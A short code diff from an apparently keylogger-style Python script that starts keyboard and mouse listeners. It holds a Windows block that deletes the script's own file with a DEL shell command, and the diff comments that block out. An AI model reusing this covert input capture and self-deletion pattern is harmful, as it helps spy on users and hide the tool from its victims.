@@ -118,6 +118,7 @@ finally:
                 keyboard_listener.join()
             with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                 mouse_listener.join()
+          '''
             if os.name == "nt":
                 try:
                     pwd = os.path.abspath(os.getcwd())
@@ -127,7 +128,7 @@ finally:
                     os.system("DEL " + os.path.basename(__file__))
                 except OSError:
                     print('File is close.')
-
+'''
             else:
                 try:
                     pwd = os.path.abspath(os.getcwd())
